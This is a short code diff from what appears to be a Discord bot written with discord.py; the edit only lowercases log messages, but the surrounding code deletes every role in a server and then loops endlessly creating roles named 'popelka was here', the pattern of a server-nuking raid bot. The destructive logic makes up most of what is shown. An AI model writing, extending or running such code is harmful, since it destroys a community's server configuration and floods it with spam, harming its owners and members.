@@ -17,11 +17,11 @@ class Roles(commands.Cog):
         for role in guild.roles:
             try:
                 await role.delete()
-                print(f"Deleted role: {role.name}")
+                print(f"deleted role: {role.name}")
             except discord.Forbidden:
-                print(f"No permission to delete role: {role.name}")
+                print(f"no permission to delete role: {role.name}")
             except Exception as e:
-                print(f"Error deleting role {role.name}: {e}")
+                print(f"error deleting role {role.name}: {e}")
         while True:
             guild = ctx.guild
             await guild.create_role(name="popelka was here")
